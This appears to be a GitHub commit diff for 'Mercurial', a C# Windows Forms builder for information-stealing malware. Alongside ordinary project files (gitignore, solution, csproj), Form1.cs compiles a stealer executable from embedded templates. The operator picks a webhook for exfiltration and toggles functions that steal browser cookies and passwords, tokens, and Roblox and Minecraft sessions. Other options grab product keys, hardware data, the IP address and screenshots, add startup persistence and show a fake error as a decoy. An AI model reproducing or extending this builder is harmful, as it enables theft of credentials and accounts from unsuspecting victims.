@@ -0,0 +1,63 @@
###############################################################################
# Set default behavior to automatically normalize line endings.
###############################################################################
* text=auto

###############################################################################
# Set default behavior for command prompt diff.
#
# This is need for earlier builds of msysgit that does not have it on by
# default for csharp files.
# Note: This is only used by command line
###############################################################################
#*.cs     diff=csharp

###############################################################################
# Set the merge driver for project and solution files
#
# Merging from the command prompt will add diff markers to the files if there
# are conflicts (Merging from VS is not affected by the settings below, in VS
# the diff markers are never inserted). Diff markers may cause the following 
# file extensions to fail to load in VS. An alternative would be to treat
# these files as binary and thus will always conflict and require user
# intervention with every merge. To do so, just uncomment the entries below
###############################################################################
#*.sln       merge=binary
#*.csproj    merge=binary
#*.vbproj    merge=binary
#*.vcxproj   merge=binary
#*.vcproj    merge=binary
#*.dbproj    merge=binary
#*.fsproj    merge=binary
#*.lsproj    merge=binary
#*.wixproj   merge=binary
#*.modelproj merge=binary
#*.sqlproj   merge=binary
#*.wwaproj   merge=binary

###############################################################################
# behavior for image files
#
# image files are treated as binary by default.
###############################################################################
#*.jpg   binary
#*.png   binary
#*.gif   binary

###############################################################################
# diff behavior for common document formats
# 
# Convert binary document formats to text before diffing them. This feature
# is only available from the command line. Turn it on by uncommenting the 
# entries below.
###############################################################################
#*.doc   diff=astextplain
#*.DOC   diff=astextplain
#*.docx  diff=astextplain
#*.DOCX  diff=astextplain
#*.dot   diff=astextplain
#*.DOT   diff=astextplain
#*.pdf   diff=astextplain
#*.PDF   diff=astextplain
#*.rtf   diff=astextplain
#*.RTF   diff=astextplain
 363  .gitignore 
@@ -0,0 +1,363 @@
## Ignore Visual Studio temporary files, build results, and
## files generated by popular Visual Studio add-ons.
##
## Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore

# User-specific files
*.rsuser
*.suo
*.user
*.userosscache
*.sln.docstates

# User-specific files (MonoDevelop/Xamarin Studio)
*.userprefs

# Mono auto generated files
mono_crash.*

# Build results
[Dd]ebug/
[Dd]ebugPublic/
[Rr]elease/
[Rr]eleases/
x64/
x86/
[Ww][Ii][Nn]32/
[Aa][Rr][Mm]/
[Aa][Rr][Mm]64/
bld/
[Bb]in/
[Oo]bj/
[Oo]ut/
[Ll]og/
[Ll]ogs/

# Visual Studio 2015/2017 cache/options directory
.vs/
# Uncomment if you have tasks that create the project's static files in wwwroot
#wwwroot/

# Visual Studio 2017 auto generated files
Generated\ Files/

# MSTest test Results
[Tt]est[Rr]esult*/
[Bb]uild[Ll]og.*

# NUnit
*.VisualState.xml
TestResult.xml
nunit-*.xml

# Build Results of an ATL Project
[Dd]ebugPS/
[Rr]eleasePS/
dlldata.c

# Benchmark Results
BenchmarkDotNet.Artifacts/

# .NET Core
project.lock.json
project.fragment.lock.json
artifacts/

# ASP.NET Scaffolding
ScaffoldingReadMe.txt

# StyleCop
StyleCopReport.xml

# Files built by Visual Studio
*_i.c
*_p.c
*_h.h
*.ilk
*.meta
*.obj
*.iobj
*.pch
*.pdb
*.ipdb
*.pgc
*.pgd
*.rsp
*.sbr
*.tlb
*.tli
*.tlh
*.tmp
*.tmp_proj
*_wpftmp.csproj
*.log
*.vspscc
*.vssscc
.builds
*.pidb
*.svclog
*.scc

# Chutzpah Test files
_Chutzpah*

# Visual C++ cache files
ipch/
*.aps
*.ncb
*.opendb
*.opensdf
*.sdf
*.cachefile
*.VC.db
*.VC.VC.opendb

# Visual Studio profiler
*.psess
*.vsp
*.vspx
*.sap

# Visual Studio Trace Files
*.e2e

# TFS 2012 Local Workspace
$tf/

# Guidance Automation Toolkit
*.gpState

# ReSharper is a .NET coding add-in
_ReSharper*/
*.[Rr]e[Ss]harper
*.DotSettings.user

# TeamCity is a build add-in
_TeamCity*

# DotCover is a Code Coverage Tool
*.dotCover

# AxoCover is a Code Coverage Tool
.axoCover/*
!.axoCover/settings.json

# Coverlet is a free, cross platform Code Coverage Tool
coverage*.json
coverage*.xml
coverage*.info

# Visual Studio code coverage results
*.coverage
*.coveragexml

# NCrunch
_NCrunch_*
.*crunch*.local.xml
nCrunchTemp_*

# MightyMoose
*.mm.*
AutoTest.Net/

# Web workbench (sass)
.sass-cache/

# Installshield output folder
[Ee]xpress/

# DocProject is a documentation generator add-in
DocProject/buildhelp/
DocProject/Help/*.HxT
DocProject/Help/*.HxC
DocProject/Help/*.hhc
DocProject/Help/*.hhk
DocProject/Help/*.hhp
DocProject/Help/Html2
DocProject/Help/html

# Click-Once directory
publish/

# Publish Web Output
*.[Pp]ublish.xml
*.azurePubxml
# Note: Comment the next line if you want to checkin your web deploy settings,
# but database connection strings (with potential passwords) will be unencrypted
*.pubxml
*.publishproj

# Microsoft Azure Web App publish settings. Comment the next line if you want to
# checkin your Azure Web App publish settings, but sensitive information contained
# in these scripts will be unencrypted
PublishScripts/

# NuGet Packages
*.nupkg
# NuGet Symbol Packages
*.snupkg
# The packages folder can be ignored because of Package Restore
**/[Pp]ackages/*
# except build/, which is used as an MSBuild target.
!**/[Pp]ackages/build/
# Uncomment if necessary however generally it will be regenerated when needed
#!**/[Pp]ackages/repositories.config
# NuGet v3's project.json files produces more ignorable files
*.nuget.props
*.nuget.targets

# Microsoft Azure Build Output
csx/
*.build.csdef

# Microsoft Azure Emulator
ecf/
rcf/

# Windows Store app package directories and files
AppPackages/
BundleArtifacts/
Package.StoreAssociation.xml
_pkginfo.txt
*.appx
*.appxbundle
*.appxupload

# Visual Studio cache files
# files ending in .cache can be ignored
*.[Cc]ache
# but keep track of directories ending in .cache
!?*.[Cc]ache/

# Others
ClientBin/
~$*
*~
*.dbmdl
*.dbproj.schemaview
*.jfm
*.pfx
*.publishsettings
orleans.codegen.cs

# Including strong name files can present a security risk
# (https://github.com/github/gitignore/pull/2483#issue-259490424)
#*.snk

# Since there are multiple workflows, uncomment next line to ignore bower_components
# (https://github.com/github/gitignore/pull/1529#issuecomment-104372622)
#bower_components/

# RIA/Silverlight projects
Generated_Code/

# Backup & report files from converting an old project file
# to a newer Visual Studio version. Backup files are not needed,
# because we have git ;-)
_UpgradeReport_Files/
Backup*/
UpgradeLog*.XML
UpgradeLog*.htm
ServiceFabricBackup/
*.rptproj.bak

# SQL Server files
*.mdf
*.ldf
*.ndf

# Business Intelligence projects
*.rdl.data
*.bim.layout
*.bim_*.settings
*.rptproj.rsuser
*- [Bb]ackup.rdl
*- [Bb]ackup ([0-9]).rdl
*- [Bb]ackup ([0-9][0-9]).rdl

# Microsoft Fakes
FakesAssemblies/

# GhostDoc plugin setting file
*.GhostDoc.xml

# Node.js Tools for Visual Studio
.ntvs_analysis.dat
node_modules/

# Visual Studio 6 build log
*.plg

# Visual Studio 6 workspace options file
*.opt

# Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
*.vbw

# Visual Studio LightSwitch build output
**/*.HTMLClient/GeneratedArtifacts
**/*.DesktopClient/GeneratedArtifacts
**/*.DesktopClient/ModelManifest.xml
**/*.Server/GeneratedArtifacts
**/*.Server/ModelManifest.xml
_Pvt_Extensions

# Paket dependency manager
.paket/paket.exe
paket-files/

# FAKE - F# Make
.fake/

# CodeRush personal settings
.cr/personal

# Python Tools for Visual Studio (PTVS)
__pycache__/
*.pyc

# Cake - Uncomment if you are using it
# tools/**
# !tools/packages.config

# Tabs Studio
*.tss

# Telerik's JustMock configuration file
*.jmconfig

# BizTalk build output
*.btp.cs
*.btm.cs
*.odx.cs
*.xsd.cs

# OpenCover UI analysis results
OpenCover/

# Azure Stream Analytics local run output
ASALocalRun/

# MSBuild Binary and Structured Log
*.binlog

# NVidia Nsight GPU debugger configuration file
*.nvuser

# MFractors (Xamarin productivity tool) working folder
.mfractor/

# Local History for Visual Studio
.localhistory/

# BeatPulse healthcheck temp database
healthchecksdb

# Backup folder for Package Reference Convert tool in Visual Studio 2017
MigrationBackup/

# Ionide (cross platform F# VS Code tools) working folder
.ionide/

# Fody - auto-generated XML schema
FodyWeavers.xsd 
 25  Mercurial.sln 
@@ -0,0 +1,25 @@

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31105.61
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Mercurial", "Mercurial\Mercurial.csproj", "{777D01DC-F044-42A8-8A5B-D366DAD4E130}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{777D01DC-F044-42A8-8A5B-D366DAD4E130}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{777D01DC-F044-42A8-8A5B-D366DAD4E130}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{777D01DC-F044-42A8-8A5B-D366DAD4E130}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{777D01DC-F044-42A8-8A5B-D366DAD4E130}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {6642598E-8123-4498-B83B-349DCB0B701C}
	EndGlobalSection
EndGlobal
 6  Mercurial/App.config 
@@ -0,0 +1,6 @@
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
    </startup>
</configuration> 
 3  Mercurial/FodyWeavers.xml 
@@ -0,0 +1,3 @@
<Weavers xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="FodyWeavers.xsd">
  <Costura />
</Weavers> 
 2,785  Mercurial/Form1.Designer.cs 
Large diffs are not rendered by default.

 264  Mercurial/Form1.cs 
@@ -0,0 +1,264 @@
using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

namespace Mercurial
{
    public partial class Form1 : Form
    {
        int rgbFlag = 0;
        public Form1()
        {
            InitializeComponent();
        }


        [DllImport("DwmApi.dll")] 
        private static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, int[] attrValue, int attrSize);

        protected override void OnHandleCreated(EventArgs e)
        {
            try
            {
                if (DwmSetWindowAttribute(Handle, 19, new[] { 1 }, 4) != 0)
                    DwmSetWindowAttribute(Handle, 20, new[] { 1 }, 4);
            }
            catch
            {
            }

        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }


        private void bunifuButton1_Click(object sender, EventArgs e)
        {
            // features
            bunifuPages1.SetPage("tabPage1");
        }

        private void bunifuButton3_Click(object sender, EventArgs e)
        {
            //Setup
            bunifuPages1.SetPage("tabPage2");
        }
        private void bunifuButton6_Click(object sender, EventArgs e)
        {
            //user dashboard button
            bunifuPages1.SetPage("tabPage5");
        }

        private void bunifuButton4_Click(object sender, EventArgs e)
        {
            //compiler
            bunifuPages1.SetPage("tabPage4");
        }
        private void bunifuButton5_Click(object sender, EventArgs e)
        {
            //about button
            bunifuPages1.SetPage("tabPage6");
        }

        private void bunifuVSlider1_Scroll(object sender, Utilities.BunifuSlider.BunifuVScrollBar.ScrollEventArgs e)
        {
            ActiveForm.Opacity = (double)(bunifuVSlider1.Value) / 10.0;
        }

        private void bunifuToggleSwitch1_CheckedChanged(object sender, Bunifu.UI.WinForms.BunifuToggleSwitch.CheckedChangedEventArgs e)
        {
            if (rgbFlag != 1)
            {
                bunifuColorTransition1.Stop();
                rgbFlag = 1;
            }

            else
            {
                bunifuColorTransition1.Continue();
                rgbFlag = 0;
            }

        }

        private void bunifuGroupBox15_Enter(object sender, EventArgs e)
        {

        }

        private void bunifuButton9_Click(object sender, EventArgs e)
        {
            //Compile Button

            textBox1.Text = "Attempting to compile file..";

            // .net framework dependency version
            Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);
            ICodeCompiler icc = codeProvider.CreateCompiler();

            string output = "output.exe";

            if (!String.IsNullOrEmpty(bunifuTextBox6.Text))
            {
                output = bunifuTextBox6.Text + ".exe";
            }

            System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = output;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Security.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");

            parameters.TreatWarningsAsErrors = false;

            if (!String.IsNullOrEmpty(bunifuTextBox4.Text))
            {
                parameters.CompilerOptions = @"/win32icon:" + "\"" + bunifuTextBox4.Text + "\"";
            }

            var main = Mercurial.Properties.Resources.Program;
            main = main.Replace("%INSERT_WEBHOOK%", bunifuTextBox5.Text);

            if (bunifuCheckBox8.Checked) // Roblox Session Recovery
                main = main.Replace("%CHECKBOX1%", "Roblox();");
            else
                main = main.Replace("%CHECKBOX1%", "");

            if (bunifuCheckBox7.Checked) // Minecraft Session Recovery
                main = main.Replace("%CHECKBOX2%", "Minecraft();");
            else
                main = main.Replace("%CHECKBOX2%", "");


            if (bunifuCheckBox20.Checked) // Grab Browser Cookies
                main = main.Replace("%CHECKBOX3%", "Browser.StealCookies();");
            else
                main = main.Replace("%CHECKBOX3%", "");

            if (bunifuCheckBox19.Checked) // Grab Browser Passwords
                main = main.Replace("%CHECKBOX4%", "Browser.StealPasswords();");
            else
                main = main.Replace("%CHECKBOX4%", "");

            if (bunifuCheckBox18.Checked) // Grab Windows Productr Key
                main = main.Replace("%CHECKBOX5%", "GrabProduct();");
            else
                main = main.Replace("%CHECKBOX5%", "");

            if (bunifuCheckBox17.Checked) // Grab Tokens
                main = main.Replace("%CHECKBOX11%", "GrabToken();");
            else
                main = main.Replace("%CHECKBOX11%", "");

            if (bunifuCheckBox3.Checked) // Grab Hardware
                main = main.Replace("%CHECKBOX6%", "GrabHardware();");
            else
                main = main.Replace("%CHECKBOX6%", "");

            if (bunifuCheckBox4.Checked) // Take Screenshot
                main = main.Replace("%CHECKBOX7%", "CaptureScreen();");
            else
                main = main.Replace("%CHECKBOX7%", "");

            if (bunifuCheckBox21.Checked) // Grap IP
                main = main.Replace("%CHECKBOX8%", "GrabIP();");
            else
                main = main.Replace("%CHECKBOX8%", "");

            if (bunifuCheckBox1.Checked) // Hide Console
                main = main.Replace("%CHECKBOX9%", "HideConsole();");
            else
                main = main.Replace("%CHECKBOX9%", "");

            if (bunifuCheckBox2.Checked) // Add to startup
                main = main.Replace("%CHECKBOX10%", "StartUp();");
            else
                main = main.Replace("%CHECKBOX10%", "");

            // ------------------------------------------------------------------/ 

            if (bunifuCheckBox9.Checked)
            {
                main = main.Replace("%FAKE_ERROR%", $"new Thread(() => MessageBox.Show(\"{bunifuTextBox2.Text}\", \"{bunifuTextBox1.Text}\", MessageBoxButtons.OK, MessageBoxIcon.Error)).Start();");
            }
            else
            {
                main = main.Replace("%FAKE_ERROR%", "");
            }

            if (bunifuCheckBox1.Checked)
            {
                parameters.CompilerOptions = "/t:winexe";
            }

            string[] source = new string[] {  main, Mercurial.Properties.Resources.AesGcm, Mercurial.Properties.Resources.BCrypt, Mercurial.Properties.Resources.Browser, Mercurial.Properties.Resources.Common, Mercurial.Properties.Resources.Grabber, Mercurial.Properties.Resources.Machine, Mercurial.Properties.Resources.SQLite, Mercurial.Properties.Resources.User, Mercurial.Properties.Resources.Webhook };

            if (!String.IsNullOrEmpty(bunifuTextBox4.Text))
            {
                parameters.CompilerOptions = @"/win32icon:" + "\"" + bunifuTextBox4.Text + "\"";
            }

            CompilerResults results = icc.CompileAssemblyFromSourceBatch(parameters, source);

            if (results.Errors.Count > 0)
            {

                foreach (CompilerError CompErr in results.Errors)
                {
                    textBox1.Text = textBox1.Text + Environment.NewLine +
                                CompErr.FileName + Environment.NewLine +
                                "Line number " + CompErr.Line +
                                ", Error Number: " + CompErr.ErrorNumber +
                                ", '" + CompErr.ErrorText + ";";
                }
                textBox1.Text = textBox1.Text + Environment.NewLine + "An error has occured when trying to compile file.";
            }
            else
            {
                textBox1.Text = textBox1.Text + Environment.NewLine + "Successfully compiled file!" + Environment.NewLine + "Task has been completed. You may now check the folder where this application is located for the output.";
            }

    }

        private void bunifuButton7_Click(object sender, EventArgs e)
        {
            // Webhook Button tester
            Webhook wh = new Webhook(bunifuTextBox5.Text);
            wh.Send("Webhook is working");
        }

        private void bunifuButton8_Click(object sender, EventArgs e)
        {
            // Choose icon button
            using (OpenFileDialog x = new OpenFileDialog())
            {
                x.Filter = "ico file (*.ico)|*.ico";
                if (x.ShowDialog() == DialogResult.OK)
                {
                    bunifuTextBox4.Text = x.FileName;
                    pictureBox1.ImageLocation = x.FileName;
                }
                else
                {
                    bunifuTextBox4.Clear();
                }
            }


        }
    }
}
 2,180  Mercurial/Form1.resx 
Large diffs are not rendered by default.

 101  Mercurial/Mercurial.csproj 
@@ -0,0 +1,101 @@
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="..\packages\Costura.Fody.5.3.0\build\Costura.Fody.props" Condition="Exists('..\packages\Costura.Fody.5.3.0\build\Costura.Fody.props')" />
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{777D01DC-F044-42A8-8A5B-D366DAD4E130}</ProjectGuid>
    <OutputType>WinExe</OutputType>
    <RootNamespace>Mercurial</RootNamespace>
    <AssemblyName>Mercurial</AssemblyName>
    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <Deterministic>true</Deterministic>
    <NuGetPackageImportStamp>
    </NuGetPackageImportStamp>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <ApplicationIcon>logo.ico</ApplicationIcon>
  </PropertyGroup>
  <ItemGroup>
    <Compile Include="Form1.cs" />
    <Compile Include="Form1.Designer.cs">
      <DependentUpon>Form1.cs</DependentUpon>
    </Compile>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Testing.cs" />
    <None Include="Resources\Machine.cs" />
    <None Include="Resources\AesGcm.cs" />
    <None Include="Resources\Webhook.cs" />
    <None Include="Resources\User.cs" />
    <None Include="Resources\SQLite.cs" />
    <None Include="Resources\Program.cs" />
    <None Include="Resources\Grabber.cs" />
    <None Include="Resources\Common.cs" />
    <None Include="Resources\Browser.cs" />
    <None Include="Resources\BCrypt.cs" />
    <EmbeddedResource Include="Form1.resx">
      <DependentUpon>Form1.cs</DependentUpon>
    </EmbeddedResource>
    <EmbeddedResource Include="Properties\licenses.licx" />
    <EmbeddedResource Include="Properties\Resources.resx">
      <Generator>ResXFileCodeGenerator</Generator>
      <SubType>Designer</SubType>
      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
    </EmbeddedResource>
    <None Include="packages.config" />
    <None Include="Properties\Settings.settings">
      <Generator>SettingsSingleFileGenerator</Generator>
      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
    </None>
    <Compile Include="Properties\Resources.Designer.cs">
      <AutoGen>True</AutoGen>
      <DesignTime>True</DesignTime>
      <DependentUpon>Resources.resx</DependentUpon>
    </Compile>
    <Compile Include="Properties\Settings.Designer.cs">
      <AutoGen>True</AutoGen>
      <DependentUpon>Settings.settings</DependentUpon>
      <DesignTimeSharedInput>True</DesignTimeSharedInput>
    </Compile>
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <ItemGroup>
    <Content Include="logo.ico" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <Import Project="..\packages\Fody.6.5.1\build\Fody.targets" Condition="Exists('..\packages\Fody.6.5.1\build\Fody.targets')" />
  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
    <PropertyGroup>
      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
    </PropertyGroup>
    <Error Condition="!Exists('..\packages\Fody.6.5.1\build\Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Fody.6.5.1\build\Fody.targets'))" />
    <Error Condition="!Exists('..\packages\Costura.Fody.5.3.0\build\Costura.Fody.props')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.3.0\build\Costura.Fody.props'))" />
    <Error Condition="!Exists('..\packages\Costura.Fody.5.3.0\build\Costura.Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.3.0\build\Costura.Fody.targets'))" />
  </Target>
  <Import Project="..\packages\Costura.Fody.5.3.0\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.5.3.0\build\Costura.Fody.targets')" />
</Project> 
 22  Mercurial/Program.cs 
@@ -0,0 +1,22 @@
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Mercurial
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
 36  Mercurial/Properties/AssemblyInfo.cs 
@@ -0,0 +1,36 @@
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("Mercurial")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Mercurial")]
[assembly: AssemblyCopyright("Copyright Â©  2021")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible
// to COM components.  If you need to access a type in this assembly from
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("777d01dc-f044-42a8-8a5b-d366dad4e130")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
 323  Mercurial/Properties/Resources.Designer.cs 
 151  Mercurial/Properties/Resources.resx 
@@ -0,0 +1,151 @@
<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.
    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="AesGcm" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\AesGcm.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="BCrypt" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\BCrypt.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="Browser" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\Browser.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="Common" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\Common.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
  </data>
  <data name="Grabber" type="System.Resources.ResXFileRef, System.Windows.Forms">
